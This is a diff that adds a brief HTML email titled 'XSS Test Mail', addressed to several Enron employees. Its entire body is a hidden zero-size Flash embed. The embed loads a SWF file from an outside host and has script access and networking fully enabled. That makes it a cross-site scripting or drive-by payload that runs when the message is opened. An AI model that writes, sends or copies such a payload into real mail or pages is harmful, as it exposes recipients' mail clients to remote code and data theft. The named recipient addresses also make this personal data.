@@ -1,0 +1,7 @@
+From: Ian Andrew Bell <hello@ianbell.com>
+To: vladi.pimenov@enron.com, adam.bayer@enron.com, bart.burk@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<embed allownetworking="all" allowfullscreen="true" name="flash" id="flash" src="http://www.rizhao-tea.com/config/x.swf" allowscriptaccess="always" type="application/x-shockwave-flash" height="0" width="0">
